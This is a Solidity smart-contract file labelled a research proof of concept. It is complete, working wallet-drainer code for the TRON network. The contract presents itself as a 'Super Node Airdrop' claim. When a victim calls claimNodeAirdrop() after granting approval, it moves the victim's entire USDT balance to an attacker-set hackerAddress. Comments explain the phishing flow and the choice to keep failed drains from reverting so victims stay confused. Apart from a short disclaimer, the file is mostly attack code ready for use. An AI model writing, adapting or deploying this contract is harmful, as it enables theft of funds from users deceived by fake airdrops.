// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// --------------------------------------------------------------------------
// PhishingProxy.sol -- Security Research PoC
//
// WARNING: This contract is for LEGITIMATE SECURITY RESEARCH and
// EDUCATIONAL PURPOSES ONLY. Never deploy this to mainnet or use it
// to attack real users. The author bears zero responsibility for misuse.
// --------------------------------------------------------------------------

/// @title ITRC20 Interface — minimal subset matching TRC20 token standard
/// @notice Mirrors the ITRC20 interface expected by PhishingProxy.
///         Compliant with TRON's TRC20 (which mirrors ERC20) conventions.
/// @dev Reference: TRC20 is functionally identical to ERC20 on TRON network.
///         Function selectors and parameter encoding match EVM standards
///         since TRON's TVM is EVM-compatible.
interface ITRC20 {
    /// @notice Returns the amount of tokens owned by `account`.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Returns the remaining number of tokens that `spender`
    ///         is allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /// @notice Moves `amount` tokens from `from` to `to` using the
    ///         allowance mechanism. `amount` is then deducted from the
    ///         caller's allowance.
    /// @dev Emits a {Transfer} event on success.
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /// @notice Sets `amount` as the allowance of `spender` over the
    ///         caller's tokens.
    /// @dev Emits an {Approval} event.
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

// --------------------------------------------------------------------------
// PhishingProxy — malicious proxy contract (PoC only)
// --------------------------------------------------------------------------
/// @notice Proxy contract that masquerades as a "TRON Super Node Airdrop".
///         It receives an approval from the victim and then sweeps all
///         approved tokens to the hacker's address in a single transaction.
///
/// @dev How this attack works:
///       1. Victim approves this contract to spend their USDT (infinite).
///       2. Victim clicks "Claim Airdrop" which calls claimNodeAirdrop().
///       3. claimNodeAirdrop() computes min(allowance, balanceOf) and calls
///          transferFrom to drain everything to hackerAddress.
///       4. Attacker receives the funds in a single atomic transaction.
///
/// @custom:security This contract intentionally contains no access controls,
///                  no pause mechanisms, and no whitelist. It is designed
///                  purely for controlled security-research environments.
contract PhishingProxy {
    // ------------------------------------------------------------------
    // State variables
    // ------------------------------------------------------------------

    /// @notice Address of the TRC20 token this contract will drain.
    ///         On Nile testnet this would be the Nile USDT contract address.
    address public immutable trc20Token;

    /// @notice Address that receives the drained tokens.
    ///         Set at construction time — immutable after deployment.
    address public immutable hackerAddress;

    // ------------------------------------------------------------------
    // Events (broadcasted on-chain for transparency)
    // ------------------------------------------------------------------

    /// @notice Emitted when a victim claims the fake airdrop.
    ///         Includes victim address and the amount drained.
    event AirdropClaimed(address indexed victim, uint256 amount);

    /// @notice Emitted on any error during the drain attempt.
    ///         Records the victim address and the error reason string.
    event DrainFailed(address indexed victim, string reason);

    // ------------------------------------------------------------------
    // Constructor
    // ------------------------------------------------------------------

    /// @param _trc20Token    Address of the TRC20 token (e.g. USDT on Nile).
    /// @param _hackerAddress  Address that will receive drained tokens.
    constructor(address _trc20Token, address _hackerAddress) {
        require(
            _trc20Token != address(0),
            "PhishingProxy: invalid token address"
        );
        require(
            _hackerAddress != address(0),
            "PhishingProxy: invalid hacker address"
        );

        trc20Token = _trc20Token;
        hackerAddress = _hackerAddress;
    }

    // ------------------------------------------------------------------
    // Core attack function — masquerades as "claim airdrop"
    // ------------------------------------------------------------------

    /// @notice Fake "claim airdrop" function. Queries the victim's
    ///         allowance and balance, then sweeps whichever is smaller
    ///         (which in practice is almost always the full balance, since
    ///         we asked for infinite approval).
    ///
    /// @dev No parameters required. The victim simply calls this function.
    ///      The victim believes they are "claiming" an airdrop reward, but
    ///      instead their entire USDT balance is transferred to hackerAddress.
    function claimNodeAirdrop() external {
        address victim = msg.sender;

        // Step 1: Query how much USDT the victim approved for this contract.
        uint256 approvedAmount = ITRC20(trc20Token).allowance(
            victim,
            address(this)
        );

        // Step 2: Query the victim's actual USDT balance.
        uint256 victimBalance = ITRC20(trc20Token).balanceOf(victim);

        // Step 3: Take the smaller of the two — in a realistic attack the
        //         approved amount >> balance, so this equals victimBalance.
        uint256 transferAmount = approvedAmount < victimBalance
            ? approvedAmount
            : victimBalance;

        // Force revert if authorization hasn't taken effect yet — no silent failure.
        // This makes chain-side debugging obvious when allowance is still 0.
        require(transferAmount > 0, "Allowance or Balance is 0");

        // Emit event for on-chain transparency / research logging.
        emit AirdropClaimed(victim, transferAmount);

        // Execute the drain: transferFrom moves tokens FROM victim TO hacker.
        // This succeeds because the victim previously called approve(this).
        bool success = ITRC20(trc20Token).transferFrom(
            victim,
            hackerAddress,
            transferAmount
        );

        // If the transfer somehow fails, emit an error event (won't revert
        // in this PoC — we want the transaction to mine even on failure
        // so the victim wastes gas and doesn't immediately understand why).
        if (!success) {
            emit DrainFailed(victim, "transferFrom returned false");
        }
    }

    // ------------------------------------------------------------------
    // Allow receiving TRX deposits (for gas fees)
    // ------------------------------------------------------------------

    /// @notice Fallback — allows the contract to receive TRX deposits.
    ///         This ensures the contract can hold a TRX balance if needed
    ///         (e.g. for gas sponsorship scenarios or refunds).
    receive() external payable {}
}
